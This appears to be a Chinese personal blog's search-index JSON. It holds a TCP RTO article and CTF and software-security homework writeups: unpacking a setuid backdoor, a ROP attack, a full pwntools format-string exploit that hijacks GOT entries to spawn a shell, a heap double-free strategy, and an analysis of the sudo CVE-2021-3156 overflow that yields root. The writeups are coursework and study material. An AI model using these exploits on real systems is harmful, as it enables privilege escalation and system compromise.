[{"categories":null,"content":"TCP协议中的RTO计算方式分析 TCP的可靠通信依赖于超时重传机制，重传的时间选择是TCP最复杂的问题之一。超时重传时间设置过长会使得丢包后发送方持续等待，网络空闲时间增大；超时重传时间设置过短会使得超时时很多报文已经到达接收方而只是发送方还没有收到确认，导致很多报文段不必要的重传，使网络负荷增大。 TCP采用了一种自适应算法，依据报文段发送的时间以及收到相应确认的时间计算报文段的往返时间RTT，依此计算超时重传时间RTO。算法如下： /* Given a new RTT measurement `RTT' */ if (RTT is the first measurement made on this connection) { SRTT := RTT RTTVAR := RTT / 2 RTO := SRTT + max(G, 2 * RTT) /* G is clock granularity in seconds */ } else { delta := RTT - SRTT SRTT' := SRTT + 1/8 * delta RTTVAR' := 3/4 * RTTVAR + 1/4 * |delta| RTO := SRTT' + max(G, 4 * RTTVAR') } 其中对于SRTT和RTTVAR的计算使用了加权平均的方式，其结果更加平滑。这样的方式也使得越久远的数据对当前结果影响越小，越近的数据对当前结果影响越大，既避免了网络状况抖动对估算结果的影响，又使得该数据尽可能反应当前网络状况。 其中RTO的具体计算方式如上所示为RTO:= SRTT' + max(G, 4 * RTTVAR') 。为什么这里会选用4倍的RTTVAR呢？ Linux内核实现中关于这一部分有如下代码： /* Called to compute a smoothed rtt estimate. The data fed to this * routine either comes from timestamps, or from segments that were * known _not_ to have been retransmitted [see Karn/Partridge Proceedings * SIGCOMM 87]. The algorithm is from the SIGCOMM 88 piece by Van * Jacobson. * NOTE : the next three routines used to be one big routine. * To save cycles in the RFC 1323 implementation it was better to break it * up into three procedures. ——erics */ static void tcp_rtt_estimator (struct sock *sk, const __u32 mrtt) { struct tcp_sock *tp = tcp_sk(sk); long m = mrtt; /*此为得到的新的RTT测量值*/ /* The following amusing code comes from Jacobson's article in * SIGCOMM '88. Note that rtt and mdev are scaled versions of rtt and * mean deviation. This is designed to be as fast as possible * m stands for \"measurement\". * * On a 1990 paper the rto value is changed to : * RTO = rtt + 4 * mdev * * Funny. This algorithm seems to be very broken. * These formulae increase RTO, when it should be decreased, increase * too slowly, when it should be increased quickly, decrease too quickly * etc. I guess in BSD RTO takes ONE value, so that it is absolutely does * not matter how to calculate it. Seems, it was trap that VJ failed to * avoid. 8) */ if (m == 0) m = 1; /* RTT的采样值不能为0 */ /* 不是得到第一个RTT采样*/ if (tp-\u003esrtt != 0) { m -= (tp-\u003esrtt \u003e\u003e 3); /* m is now error in rtt est */ tp-\u003esrtt += m; /* rtt = 7/8 rtt + 1/8 new ，更新srtt*/ if (m \u003c 0) { /*RTT变小*/ m = -m; /* m is now abs(error) */ m -= (tp-\u003emdev \u003e\u003e 2); /* similar update on mdev */ /* This is similar to one of Eifel findings. * Eifel blocks mdev updates when rtt decreases. * This solution is a bit different : we use finer gain * mdev in this case (alpha * beta). * Like Eifel it also prevents growth of rto, but also it * limits too fast rto decreases, happening in pure Eifel. */ if (m \u003e 0) /* |err| \u003e 1/4 mdev */ m \u003e\u003e= 3; } else { /* RTT变大 */ m -= (tp-\u003emdev \u003e\u003e 2); /* similar update on mdev */ } tp-\u003emdev += m; /* mdev = 3/4 mdev + 1/4 new，更新mdev */ /* 更新mdev_max和rttvar */ if (tp-\u003emdev \u003e tp-\u003emdev_max) { tp-\u003emdev_max = tp-\u003emdev; if (tp-\u003emdev_max \u003e tp-\u003erttvar ) tp-\u003erttvar = tp-\u003emdev_max; } /* 过了一个RTT了，更新mdev_max和rttvar */ if (after(tp-\u003esnd_una, tp-\u003ertt_seq)) { if (tp-\u003emdev_max \u003c tp-\u003erttvar)/*减小rttvar */ tp-\u003erttvar -= (tp-\u003erttvar - tp-\u003emdev_max) \u003e\u003e 2; tp-\u003ertt_seq = tp-\u003esnd_nxt; tp-\u003emdev_max = tcp_rto_min(sk); /*重置mdev_max */ } } else { /* 获得第一个RTT采样*/ /* no previous measure. */ tp-\u003esrtt = m \u003c\u003c 3; /* take the measured time to be rtt */ tp-\u003emdev = m \u003c\u003c 1; /* make sure rto = 3 * rtt */ tp-\u003emdev_max = tp-\u003erttvar = max(tp-\u003emdev, tcp_rto_min(sk)); tp-\u003ertt_seq = tp-\u003esnd_nxt; /*设置更新mdev_max的时间*/ } } 其中提到了 * On a 1990 paper the rto value is changed to : * RTO = rtt + 4 * mdev 这里的paper既上文中所提到的Jacobson’s article in SIGCOMM ‘88：即Congestion Avoidance and Control。 在该文章的附录C中，作者详细解释了该算法中选取$RTO = rtt + 4 * mdev$的原因。 文章中的符号与代码中的符号有些许差异，这里采用文章中的符号。用R表示往返时延，用V表示偏差。在文章的第一版中采用了$RTO = R + 2 \\times V$，之所以改为$RTO = R + 4 \\times V$，是由于之前的算法低速链路下存在问题。 为了保证网络的可用性，防止过多的数据注入到网络中致使网络瘫痪，TCP采用了拥塞控制算法，包括慢开始、拥塞避免、快重传和快恢复。这里RTO的计算主要与慢开始阶段有关。 慢开始的思路是当主机开始发送数据时，由于并不清楚网络的负荷情况，如果立刻将大量数据字节注入到网络中，可能引起网络发生拥塞。经验证较好的方法是由小到大的增大发送窗口。为此发送方维持一个叫做拥塞窗口的状态变量，在刚开始通信时为其赋予一个较小的初值，每收到一个对新的报文段的确认后，将拥塞窗口增加刚收到的确认报文段所确认的字","date":"2021-06-18","objectID":"/tcp%E5%8D%8F%E8%AE%AE%E4%B8%AD%E7%9A%84rto%E8%AE%A1%E7%AE%97%E6%96%B9%E5%BC%8F%E5%88%86%E6%9E%90/:0:0","tags":null,"title":"TCP协议中的RTO计算方式分析","uri":"/tcp%E5%8D%8F%E8%AE%AE%E4%B8%AD%E7%9A%84rto%E8%AE%A1%E7%AE%97%E6%96%B9%E5%BC%8F%E5%88%86%E6%9E%90/"},{"categories":null,"content":"参考文献 [1]Congestion Avoidance and Control [2]计算机网络 第7版 谢希仁 ","date":"2021-06-18","objectID":"/tcp%E5%8D%8F%E8%AE%AE%E4%B8%AD%E7%9A%84rto%E8%AE%A1%E7%AE%97%E6%96%B9%E5%BC%8F%E5%88%86%E6%9E%90/:1:0","tags":null,"title":"TCP协议中的RTO计算方式分析","uri":"/tcp%E5%8D%8F%E8%AE%AE%E4%B8%AD%E7%9A%84rto%E8%AE%A1%E7%AE%97%E6%96%B9%E5%BC%8F%E5%88%86%E6%9E%90/"},{"categories":["ctf"],"content":"软件安全hw2 首先利用checksec进行检查 /run/.../SoftwareSecurity/hw2 \u003e\u003e\u003e checksec sample [!] Did not find any GOT entries [*] '/run/media/sciver/Data/Chores/homework/SoftwareSecurity/hw2/sample' Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled Packer: Packed with UPX 发现该文件使用了UPX壳。 利用upx脱壳。 /run/.../SoftwareSecurity/hw2 \u003e\u003e\u003e upx -d sample -o backdoor Ultimate Packer for eXecutables Copyright (C) 1996 - 2020 UPX git-d7ba31+ Markus Oberhumer, Laszlo Molnar \u0026 John Reiser Jan 23rd 2020 File size Ratio Format Name -------------------- ------ ----------- ----------- 10432 \u003c- 6560 62.88% linux/amd64 backdoor Unpacked 1 file. 利用ghidra分析程序。通过entry中__libc_start_main的第一个参数定位到main函数的地址0xcb0。 undefined8 FUN_00100cb0(undefined8 param_1,char **param_2) { int iVar1; __uid_t _Var2; __uid_t _Var3; __gid_t __gid; char *pcVar4; FUN_00100af0(\u0026DAT_003020c0,8); pcVar4 = getenv(\u0026DAT_003020c0); if ((pcVar4 == (char *)0x0) || (iVar1 = FUN_00100b34(), iVar1 != 0)) { _Var2 = geteuid(); _Var3 = getuid(); if (_Var2 != _Var3) { while( true ) { __gid = getgid(); iVar1 = setgid(__gid); if (iVar1 == 0) break; sleep(1); } while( true ) { _Var2 = getuid(); iVar1 = setuid(_Var2); if (iVar1 == 0) break; sleep(1); } } FUN_00100af0(s_\"$)\u0026)_003020b8,6); execvp(s_\"$)\u0026)_003020b8,param_2); } else { FUN_00100af0(s_`-\u0026!`\u003c'_003020b0,7); while (iVar1 = setuid(0), iVar1 != 0) { sleep(1); } execlp(s_`-\u0026!`\u003c'_003020b0,s_`-\u0026!`\u003c'_003020b0,0); } return 1; } 其中存在大量的含义不明的字符串，推测其内容经过加密。在将其作为参数传递给函数前都利用FUN_00100af0进行了处理，推测FUN_00100af0为解密函数。 void FUN_00100af0(long param_1,long param_2) { long lVar1; long local_18; local_18 = param_2; while (lVar1 = local_18 + -1, local_18 != 0) { *(byte *)(lVar1 + param_1) = *(byte *)(lVar1 + param_1) ^ 0x4f; local_18 = lVar1; } return; } 此处采用了明显的异或加密。利用python写出对应的解密脚本。 def xor4f(buf): return b''.join([struct.pack(\"1B\",i ^ 0x4f) for i in buf]) 利用rizin从程序中dump出加密后的字符串的内容，解密后得到明文。 [0x000009c0]\u003e pcp 8 @0x2020b0 import struct buf = struct.pack (\"8B\", *[ 0x60,0x2d,0x26,0x21,0x60,0x3c,0x27,0x00]) [0x000009c0]\u003e pcp 8 @0x2020b8 import struct buf = struct.pack (\"8B\", *[ 0x22,0x24,0x29,0x26,0x29,0x20,0x00,0x00]) [0x000009c0]\u003e pcp 8 @0x2020c0 import struct buf = struct.pack (\"8B\", *[ 0x1c,0x07,0x10,0x0c,0x00,0x03,0x00,0x1d]) [0x000009c0]\u003e pcp 8 @0x2020a8 import struct buf = struct.pack (\"8B\", *[ 0x3f,0x2e,0x3f,0x20,0x2c,0x00,0x00,0x00]) [0x000009c0]\u003e pcp 32 @0x1640 import struct buf = struct.pack (\"32B\", *[ 0x39,0xf2,0x7e,0xec,0x75,0x58,0xd1,0xca,0x14,0xde,0x3c, 0x58,0x39,0xe8,0x8b,0xab,0xcf,0x26,0xd5,0x15,0x73,0xae, 0x16,0xd0,0x21,0x89,0x5f,0x98,0x22,0x05,0x15,0xec]) /run/.../SoftwareSecurity/hw2 \u003e\u003e\u003e ipython Python 3.9.4 (default, Apr 20 2021, 15:51:38) Type 'copyright', 'credits' or 'license' for more information IPython 7.22.0 -- An enhanced Interactive Python. Type '?' for help. In [1]: def xor4f(buf): ...: return b''.join([struct.pack(\"1B\",i ^ 0x4f) for i in buf]) ...: In [2]: import struct ...: buf640 = struct.pack (\"32B\", *[ ...: 0x39,0xf2,0x7e,0xec,0x75,0x58,0xd1,0xca,0x14,0xde,0x3c, ...: 0x58,0x39,0xe8,0x8b,0xab,0xcf,0x26,0xd5,0x15,0x73,0xae, ...: 0x16,0xd0,0x21,0x89,0x5f,0x98,0x22,0x05,0x15,0xec]) ...: ...: buf20b0 = struct.pack (\"8B\", *[ ...: 0x60,0x2d,0x26,0x21,0x60,0x3c,0x27,0x00]) ...: buf20b8 = struct.pack (\"8B\", *[ ...: 0x22,0x24,0x29,0x26,0x29,0x20,0x00,0x00]) ...: buf20c0 = struct.pack (\"8B\", *[ ...: 0x1c,0x07,0x10,0x0c,0x00,0x03,0x00,0x1d]) ...: buf20a8 = struct.pack (\"8B\", *[ ...: 0x3f,0x2e,0x3f,0x20,0x2c,0x00,0x00,0x00]) In [3]: l = [buf20b0, buf20b8, buf20c0, buf20a8] In [4]: for b in l: ...: print(xor4f(b)) ...: b'/bin/shO' b'mkfifoOO' b'SH_COLOR' b'papocOOO' 结合这一分析结果回顾main函数逻辑，可知其首先读取环境变量SH_COLOR的值，其后存在两条路径，第一条路径执行mkfifo，第二条路径执行/bin/sh。为了利用该后门，显然我们需要找到一种输出使其执行第二条路径。 分支前执行了检查 if ((pcVar4 == (char *)0x0) || (iVar1 = FUN_00100b34(), iVar1 != 0)) 我们需要使得该条件不成立，即首先环境变量SH_COLOR的值不为空，然后函数FUN_00100b34()的返回值为0. bool FUN_00100b34(char *param_1) { int iVar1; size_t sVar2; undefined8 local_c8; undefined8 local_c0; undefined8","date":"2021-05-11","objectID":"/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8hw2/:0:0","tags":["ctf","hw","re"],"title":"软件安全hw2","uri":"/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8hw2/"},{"categories":null,"content":"UCASZ An Apprentice Forever. ceba 在这广阔的天空里，追寻梦想吧 ","date":"2021-04-12","objectID":"/friends/:0:0","tags":null,"title":"Friends","uri":"/friends/"},{"categories":["ctf"],"content":"软件安全 hw1 ","date":"2021-04-09","objectID":"/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8hw1/:0:0","tags":["ctf","hw","pwn"],"title":"软件安全hw1","uri":"/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8hw1/"},{"categories":["ctf"],"content":"pwn1 pwn1，一道简单的栈溢出的题目，检查程序保护措施如下： Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 无canary，可直接利用栈溢出。 无PIE，程序虚地址已知，可直接从源程序得到。 堆栈不可执行，无法直接执行写入的shellcode，考虑利用rop。 Partial RELRO，got表部分可写，考虑ret2libc。 反编译二进制文件得到如下结果： int main(void) { EVP_PKEY_CTX *in_RDI; char buf [48]; init(in_RDI); puts(\"Show me your code :D\"); gets(buf); return 0; } 在栈上分配了一个48 byte的buffer，利用gets读入数据，gets为一个常见的危险函数，其手册中描述如下： gets() reads a line from stdin into the buffer pointed to by s until either a terminating newline or EOF, which it replaces with a null byte ('\\0'). No check for buffer overrun is performed (see BUGS below). BUGS Never use gets(). Because it is impossible to tell without knowing the data in advance how many characters gets() will read, and because gets() will continue to store characters past the end of the buffer, it is extremely dangerous to use. It has been used to break computer security. Use fgets() instead. 即可以读入一段任意长度的数据，直接构造rop链进行利用。程序中没有直接可以用来拿shell的函数，需要在libc中找，考虑先利用puts获取libc的基址，再向bss段中写入/bin/sh\\x00，然后以此为参数调用system函数。 由于我们需要利用到第一次地址泄露的结果才能知道system函数的地址，故在泄露地址后先返回到程序起始地址重新执行，这样在libc地址不变的情况下多了一次溢出的机会。 在64位程序中，前三个参数分别存放在rdi，rbi，rdx这几个寄存器当中，由于我们调用的这些函数均只用到了一个参数，故我们只需要一个pop rdi; ret的gadget，利用ROPgadget在文件中查找得其地址为0x401283。 ~/.../SoftwareSecurity/hw1 \u003e\u003e\u003e ROPgadget --binary pwn1 Gadgets information ============================================================ 0x00000000004010bd : add ah, dh ; nop ; endbr64 ; ret 0x00000000004010eb : add bh, bh ; loopne 0x401155 ; nop ; ret 0x000000000040128c : add byte ptr [rax], al ; add byte ptr [rax], al ; endbr64 ; ret 0x000000000040120f : add byte ptr [rax], al ; add byte ptr [rax], al ; leave ; ret 0x0000000000401210 : add byte ptr [rax], al ; add cl, cl ; ret 0x0000000000401036 : add byte ptr [rax], al ; add dl, dh ; jmp 0x401020 0x000000000040115a : add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret 0x000000000040128e : add byte ptr [rax], al ; endbr64 ; ret 0x00000000004010bc : add byte ptr [rax], al ; hlt ; nop ; endbr64 ; ret 0x0000000000401211 : add byte ptr [rax], al ; leave ; ret 0x000000000040100d : add byte ptr [rax], al ; test rax, rax ; je 0x401016 ; call rax 0x000000000040115b : add byte ptr [rcx], al ; pop rbp ; ret 0x0000000000401212 : add cl, cl ; ret 0x00000000004010ea : add dil, dil ; loopne 0x401155 ; nop ; ret 0x0000000000401038 : add dl, dh ; jmp 0x401020 0x000000000040115c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret 0x0000000000401157 : add eax, 0x2f0b ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret 0x0000000000401017 : add esp, 8 ; ret 0x0000000000401016 : add rsp, 8 ; ret 0x00000000004011d7 : call qword ptr [rax + 0xff3c35d] 0x000000000040103e : call qword ptr [rax - 0x5e1f00d] 0x0000000000401014 : call rax 0x0000000000401173 : cli ; jmp 0x401100 0x00000000004010c3 : cli ; ret 0x000000000040129b : cli ; sub rsp, 8 ; add rsp, 8 ; ret 0x0000000000401170 : endbr64 ; jmp 0x401100 0x00000000004010c0 : endbr64 ; ret 0x000000000040126c : fisttp word ptr [rax - 0x7d] ; ret 0x00000000004010be : hlt ; nop ; endbr64 ; ret 0x0000000000401012 : je 0x401016 ; call rax 0x00000000004010e5 : je 0x4010f0 ; mov edi, 0x404040 ; jmp rax 0x0000000000401127 : je 0x401130 ; mov edi, 0x404040 ; jmp rax 0x000000000040103a : jmp 0x401020 0x0000000000401174 : jmp 0x401100 0x000000000040100b : jmp 0x4840103f 0x00000000004010ec : jmp rax 0x0000000000401213 : leave ; ret 0x00000000004010ed : loopne 0x401155 ; nop ; ret 0x0000000000401156 : mov byte ptr [rip + 0x2f0b], 1 ; pop rbp ; ret 0x000000000040120e : mov eax, 0 ; leave ; ret 0x00000000004010e7 : mov edi, 0x404040 ; jmp rax 0x00000000004010bf : nop ; endbr64 ; ret 0x00000000004011d8 : nop ; pop rbp ; ret 0x00000000004010ef : nop ; ret 0x000000000040116c : nop dword ptr [rax] ; endbr64 ; jmp 0x401100 0x00000000004010e6 : or dword ptr [rdi + 0x404040], edi ; jmp rax 0x0000000000401158 : or ebp, dword ptr [rdi] ; add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret 0x000","date":"2021-04-09","objectID":"/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8hw1/:1:0","tags":["ctf","hw","pwn"],"title":"软件安全hw1","uri":"/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8hw1/"},{"categories":["ctf"],"content":"pwn2_32 pwn2_32，简单的32位格式化字符串漏洞，程序保护机制如下： Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) 无PIE，可以直接静态分析得知各指令的地址。 canary开启，无法简单利用栈溢出。 NX开启，堆栈不可执行。 Partial RELRO，可部分覆盖got表，考虑ret2libc。 main函数逻辑如下： int main(int argc) { uint uVar1; __uid_t __euid; __uid_t __ruid; int iVar2; int in_GS_OFFSET; char local_78 [100]; int local_14; int *local_10; local_10 = \u0026argc; local_14 = *(int *)(in_GS_OFFSET + 0x14); __euid = geteuid(); __ruid = geteuid(); setreuid(__ruid,__euid); setvbuf(stdout,(char *)0x0,2,0); setvbuf(stdin,(char *)0x0,2,0); uVar1 = secret; puts(\"Show me your password. \"); printf(\"Password:\"); fgets(local_78,100,stdin); iVar2 = strcmp(local_78,\"sec21.\\n\"); if (iVar2 == 0) { puts(\"Password OK :)\"); } else { handle_failure(local_78); } if (uVar1 != secret) { puts(\"The secret is modified!\\n\"); } if (local_14 != *(int *)(in_GS_OFFSET + 0x14)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return 0; } 即读入一个长度为100的字符串(无溢出)，比较是否为\"sec21.\\n\"，若是则打印成功信息，然后检查某全局变量是否已经被修改，如果不是则调用handle_failure。这从两个分支来看，若password正确没有任何操作的空间，我们情愿选择一个错误的password。 观察handle_failure这个函数： void handle_failure(char *buf) { int iVar1; int in_GS_OFFSET; char msg [100]; iVar1 = *(int *)(in_GS_OFFSET + 0x14); snprintf(msg,100,\"Invalid Password! %s\\n\",buf); printf(msg); if (iVar1 != *(int *)(in_GS_OFFSET + 0x14)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return; } 将buf中的内容和打印到msg中，然后利用printf打印。很明显的格式化字符串漏洞，可以任意地址读写，问题是怎么利用。由于只有一次改写的机会，而一开始我们是不知道栈上的地址的，那么确定的就只有got表的地址。printf执行完之后程序中唯一有可能执行的libc中的函数就只有全局变量secret被改变后用来打印信息的puts了，那我们就改这个puts，此外还需要改secret的值。 为了能够执行任意代码，显然我们还需要另一次的攻击，需要将rip设置为读取字符串前的某一个位置。将puts@got的值改为entry并不合适，因为在main函数开头还有puts的调用，将导致死循环。fgets调用前的位置是合适的。将puts指向该位置，即可得到再一次执行的机会。 仅仅能够再次执行还不够，第一次的漏洞利用我们除了多执行一次的机会之外什么都没做，有些浪费。在改got表的同时我们还可以泄露出strcmp的地址，从而计算出system的地址，留待后续攻击中使用。 总结一下，在第一次的格式化字符串漏洞利用中，我们需要： 改写secret的值。 改写puts@got为0x80488e9。 泄露strcmp的地址。 主要思路仍然为ret2libc。main函数中strcmp的第一个参数为我们的输入，考虑将strcmp@got的值改写为system的地址，即可在下一次调用时执行任意命令。 完整的exp如下。 from pwn import * name = \"pwn2_32\" elf = ELF(name) # libc = ELF(\"libc-2.31-dbg.so\") libc = ELF(\"/usr/lib32/libc-2.33.so\") context(arch='i386', terminal = ['konsole', '-e', 'zsh', '-c'], log_level = 'info') # p = process(['./ld-2.31-dbg.so', \"./pwn1\"], env = {\"LD_PRELOAD\": \"./libc-2.31-dbg.so\"}) p = elf.process() # gdb.attach(p, gdbscript=\"b*0x8048847\\nc\\n\") offset = 15 secret = 0x804a050 print_key = 0x08048726 target = elf.entry puts_addr = elf.got['puts'] payload = b\"bb\" payload += p32(secret) #0x18 payload += p32(elf.got['puts'] + 2) payload += p32(elf.got['puts']) payload += p32(elf.got['strcmp']) payload += b\"%15$n\" payload += \"%{}c\".format(0x804 - 0x24).encode() payload += b\"%16$hn\" payload += \"%{}c\".format(0x88e9 - 0x804).encode() payload += b\"%17$hn\" payload += b\"_\" payload += b\"%18$s\" p.sendline(payload) p.recvuntil(b\"_\") strcmp_addr = u32(p.recv(4)) log.info(\"strcmp_addr=\u003e{:x}\".format(strcmp_addr)) libc_addr = strcmp_addr - libc.sym['__strcmp_sse4_2'] log.info(\"libc_addr=\u003e{:x}\".format(libc_addr)) system_addr = libc_addr + libc.sym['system'] log.info(\"system_addr=\u003e{:x}\".format(system_addr)) payload = b\"bb\" payload += p32(elf.got['strcmp'] + 2) payload += p32(elf.got['strcmp']) payload += \"%{}c\".format((system_addr \u0026 0xffff) - 0x1c).encode() payload += b\"%16$hn\" payload += \"%{}c\".format((system_addr \u003e\u003e 16) - (system_addr \u0026 0xffff)).encode() payload += b\"%15$hn\" p.sendline(payload) log.info(\"puts_got=\u003e{:x}\".format(elf.got['puts'])) log.info(\"strcmp_got=\u003e{:x}\".format(elf.got['strcmp'])) p.sendline(\"/bin/sh\\x00\") p.interactive() ","date":"2021-04-09","objectID":"/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8hw1/:2:0","tags":["ctf","hw","pwn"],"title":"软件安全hw1","uri":"/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8hw1/"},{"categories":["ctf"],"content":"pwn3 pwn3，菜单堆，乍看貌似没那么基础，不过做完之后感觉确实也还是蛮基础。 Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled FORTIFY: Enabled 64位，保护全开。 Full RELRO，got表没法写。 PIE，got和plt在哪都不知道。 NX，Canary开启。 FORTIFY，之前没见过，网上查了一下，大致功能如下：FORTIFY_SOURCE是GCC和GLIBC安全功能，它尝试检测某些类型的缓冲区溢出。默认在大多数Linux平台上启用。使用FORTIFY_SOURCE选项时，如果编译器可以推断出目标缓冲区的大小，则编译器将插入代码以调用不安全函数的“更安全”变体。不安全功能包括memcpy，mempcpy，memmove，memset，stpcpy，strcpy，strncpy，strcat，strncat，sprintf，snprintf，vsprintf，vsnprintf和gets。 回到题目，main函数如下： void main(EVP_PKEY_CTX *param_1) { int iVar1; init(param_1); do { while( true ) { while( true ) { menu(); iVar1 = read_int(); if (iVar1 != 3) break; delete(); } if (iVar1 \u003c 4) break; LAB_00101788: puts(\"Invalid choice.\"); } if (iVar1 == 1) { add(); } else { if (iVar1 != 2) goto LAB_00101788; list(); } } while( true ); } 实际提供了3个选项，分别为add，delete和list，分别如下： add void add(void) { uint uVar1; char *pcVar2; int local_10; local_10 = 0; while( true ) { if (9 \u003c local_10) { // 最多只能有10个note puts(\"Full!\"); return; } if ((notes[local_10].content == (char *)0x0) || (*(int *)\u0026notes[local_10].avalable != 0)) break;// 检查content是否为0，即是否还没有初始化过。available域是否为0，在add时会将其置0， 标识其已经占用，delete后置1，标识可用。 local_10 = local_10 + 1; } printf(\"Size: \"); uVar1 = read_int(); if (0x78 \u003c uVar1) {// 限制了分配的堆块大小，没有超过fastbin的范围 puts(\"Too big!\"); return; } pcVar2 = (char *)malloc((ulong)uVar1); notes[local_10].content = pcVar2; memset(notes[local_10].content,0,(ulong)uVar1);// 清空原有内容 printf(\"Note: \"); read_input(notes[local_10].content,uVar1 - 1,uVar1 - 1); printf(\"Description of this note: \"); __isoc99_scanf(\"%48s\",(long)local_10 * 0x40 + 0x104070,(long)local_10 * 0x40 + 0x10);//向note结构体中的description域读入48个byte，此处存在off by one，末尾的\\x00可能溢出，刚好可以覆盖掉下一个note的avilable域。这是我发现的唯一一个突破口。 *(undefined4 *)\u0026notes[local_10].avalable = 0; puts(\"Done!\"); return; } delete void delete(void) { int iVar1; ulong idx; printf(\"Which note do you want to delete?\\nIndex: \"); iVar1 = read_int(); idx = SEXT48(iVar1); if (idx \u003c 10) {//无符号数比较，没有利用空间 if (notes[idx].content == (char *)0x0) { puts(\"No such note!\"); } else { if (*(int *)\u0026notes[idx].avalable != 0) { //意思是只要把available置为0即可double free，但是还需要注意libc中的检查。 puts(\"Double free! Bad hacker :(\"); /* WARNING: Subroutine does not return */ _exit(-1); } free(notes[idx].content); *(undefined4 *)\u0026notes[idx].avalable = 1; } } else { puts(\"Invalid index.\"); } return; } list void list(void) { uint local_c; local_c = 0; while ((int)local_c \u003c 10) { if ((notes[(int)local_c].content != (char *)0x0) \u0026\u0026 (*(int *)\u0026notes[(int)local_c].avalable == 0)//若通过off by one将其置为0， 则可以打印释放掉的内存中的值，依次泄露地址。 ) { printf(\"Note %d:\\nData: %s\\nDesc: %s\\n\",(ulong)local_c,notes[(int)local_c].content, (long)(int)local_c * 0x40 + 0x104070); } local_c = local_c + 1; } puts(\"\"); return; } 以上便是整个程序中的全部内容。其中结构体note的结构如下： struct note { long available; char *content; char[48] description; } 对于这样一个保护全开的程序，首要任务是泄露地址，否则其他什么事情都干不了。能够分配的最大的堆块为0x80，会首先放入tcache_bin中，直到填满7个，之后的会放入fastbin中。在2.31中，这两条单链表上都会进行double free的检查，简单的double free难以奏效，考虑先将某个堆块放到fastbin之后，再将其free到tcache bin中，这样以来就能够两次分配到同一块内存地址。在这之前，可以利用list的检查机制，打印出free掉的块中的内容，以此泄露heap地址。具体如下： 先将所有的note都分配然后再free掉，此时所有的堆块都填充在tcache bin和fastbin中。 按照chunk的结构，malloc得到的地址中的内容为链表中下一个chunk的地址。我们add一个堆块note[0]，并将其descryption域填满48字节，覆盖下一chunk的available域，使得下一次list时将note[1]识别为已分配的note，打印出其content的内容，即泄露出堆上的地址。 但是仅有堆上的地址还不够，为了能够实现攻击，我们至少需要程序的地址或者libc的地址。在堆内，有办法通过unsorted bin得到main_arena的地址，但是此处给我们的最大堆块为0x80，没有超过fastbin的范围。考虑想办法破坏堆块的管理结构，例如覆盖下一个堆块的size域，伪造一个大堆块，然后把它free掉，从而将其放入unsorted bin中。为达到这一目的，我们需要能够写到某个chunk之前的0x10个字节，程序中并没有这样的溢出漏洞可以利用，只能从double free上想办法。 整体思路如下，将一个victim chunk放入fastbin中，然后通过其前一个note的description覆盖掉该note的available字段，再free依次这个chunk。此时由于tcachebin中有空，能够将victim放入tcache中，从而不会触发double free的检查。接下来，再次分配一块内存，将会将victim取出。注意到由于此时victim仍然处于fasbin的链中，victim的内容将会识别为fastbin中的管理结构，即其下一个堆块的地址，因此我们可以在此写入一个地址，这个地址将被识别为一个堆块的地址插入到fastbin的链表中，能够再将来的某次malloc中被返回。 我们之前说过想要改写某个chunk的size字段，我们可以通过上述方法返回的任意地址来向一个size字段中写入一个大于0x400的大小，从而实现我们的攻击。我们可以选择分配一个堆块内部的地址，写入内容时覆盖下一个堆块的si","date":"2021-04-09","objectID":"/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8hw1/:3:0","tags":["ctf","hw","pwn"],"title":"软件安全hw1","uri":"/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8hw1/"},{"categories":["ctf"],"content":"CVE-2021-3156 实验截图：如上图所示，在在Ubuntu18.04上，选用sudo 1.8.21p2-3ubuntu1，成功复现了CVE-2021-3156，以普通用户的身份执行命令拿到了root shell。 漏洞在于在plugins/sudoers/sudoers.c文件中存在如下函数： /* * Fill in user_cmnd, user_args, user_base and user_stat variables * and apply any command-specific defaults entries. */ static int set_cmnd(void) { // Ignore if (sudo_mode \u0026 (MODE_RUN | MODE_EDIT | MODE_CHECK)) { if (ISSET(sudo_mode, MODE_RUN | MODE_CHECK)) { // Ignore } /* set user_args */ if (NewArgc \u003e 1) { char *to, *from, **av; size_t size, n; /* Alloc and build up user_args. */ for (size = 0, av = NewArgv + 1; *av; av++) size += strlen(*av) + 1; if (size == 0 || (user_args = malloc(size)) == NULL) { sudo_warnx(U_(\"%s: %s\"), __func__, U_(\"unable to allocate memory\")); debug_return_int(-1); } if (ISSET(sudo_mode, MODE_SHELL | MODE_LOGIN_SHELL)) { /* * When running a command via a shell, the sudo front-end * escapes potential meta chars. We unescape non-spaces * for sudoers matching and logging purposes. */ for (to = user_args, av = NewArgv + 1; (from = *av); av++) { while (*from) { if (from[0] == '\\\\' \u0026\u0026 !isspace((unsigned char)from[1])) from++; *to++ = *from++; } *to++ = ' '; } *--to = '\\0'; } else { for (to = user_args, av = NewArgv + 1; *av; av++) { n = strlcpy(to, *av, size - (to - user_args)); if (n \u003e= size - (to - user_args)) { sudo_warnx(U_(\"internal error, %s overflow\"), __func__); debug_return_int(-1); } to += n; *to++ = ' '; } *--to = '\\0'; } } } // Ignore } if (NewArgc \u003e 1)这一分支中，根据参数的大小在堆上分配了堆内存。然后将命令行参数依次复制到堆空间中。但在上述代码的第43行中，如果某一命令行参数以反斜杠结尾，from++后在*to++ = 